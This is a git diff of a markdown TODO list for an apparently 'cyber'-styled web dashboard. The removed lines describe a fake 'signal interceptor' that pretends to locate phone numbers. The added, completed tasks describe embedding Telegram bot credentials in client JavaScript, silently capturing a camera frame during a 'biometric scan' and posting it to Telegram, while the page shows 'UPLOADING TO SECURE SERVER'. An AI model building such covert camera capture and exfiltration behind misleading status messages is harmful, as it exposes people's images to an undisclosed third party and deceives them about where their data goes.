@@ -1,10 +1,8 @@
-# TODO: Add Phone Tracker Button to Dashboard
+# TODO: Integrate Biometric Scanner with Telegram Bot
 
 ## Tasks to Complete:
-- [x] Add FontAwesome CSS link in the <head> section of templates/dashboard.html
-- [x] Add CSS for pulsing animation on the icon and neon green border for the new button
-- [x] Insert the 7th action-card in the actions-grid with pulsing fa-phone-alt icon, "SIGNAL INTERCEPTOR" label, and onclick="openModal('TELECOM INTELLIGENCE')"
-- [x] Update the openModal() function to add a case for 'TELECOM INTELLIGENCE': play the cyber sound (playTypingSound), display a modal with a map, phone number input, and target profile status
-- [x] Add initPhoneTrackerMap() function: initializes Leaflet map, adds input event listener; if number starts with +964, flyTo Iraq coordinates with zoom 6, update status to [INTERCEPTING...] then [LOCATED] after 2 seconds
-- [ ] Test the new button and modal functionality locally
-- [x] Run git add ., git commit -m "Added Signal Interceptor Button and Linked Phone Tracking", git push origin master
+- [x] Add Telegram credentials (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID) to the JavaScript
+- [x] Update startCamera function to capture video frame after 3 seconds, convert to Blob (image/jpeg), and send via fetch to Telegram API
+- [x] Update UI feedback: show 'UPLOADING TO SECURE SERVER...' while sending, then 'THREAT ANALYSIS COMPLETE - DATA SENT'
+- [x] Test the biometric scan and Telegram integration locally
+- [x] Run git add ., git commit -m "Integrated Biometric Scanner with Telegram Bot", git push origin master
